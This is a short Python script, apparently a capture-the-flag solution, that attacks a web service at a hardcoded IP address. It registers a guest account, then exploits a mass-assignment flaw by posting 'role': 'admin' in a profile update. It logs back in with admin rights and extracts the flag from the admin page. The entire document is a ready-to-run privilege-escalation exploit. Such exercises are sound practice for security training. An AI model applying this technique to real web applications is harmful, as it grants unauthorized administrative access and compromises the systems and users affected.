import re

import requests

BASE_URL = "http://23.179.17.92:5556"


def register(s, id, pw):
    data = {
        "username": id,
        "password": pw,
        "full_name": "guest",
        "title": "guest",
        "team": "guest",
    }
    return s.post(f"{BASE_URL}/api/register", data=data)


def login(s, id, pw):
    data = {
        "username": id,
        "password": pw,
    }
    return s.post(f"{BASE_URL}/api/login", data=data)


def update(s, id, pw):
    data = {
        "username": id,
        "password": pw,
        "role": "admin",
        "full_name": "guest",
        "title": "guest",
        "team": "guest",
    }
    return s.post(f"{BASE_URL}/api/profile", data=data)


s = requests.Session()
id = "guest"
pw = "Password123!"

register(s, id, pw)
login(s, id, pw)
update(s, id, pw)
login(s, id, pw)

res = s.get(f"{BASE_URL}/admin")
print(re.search("CIT{.+}", res.text).group())
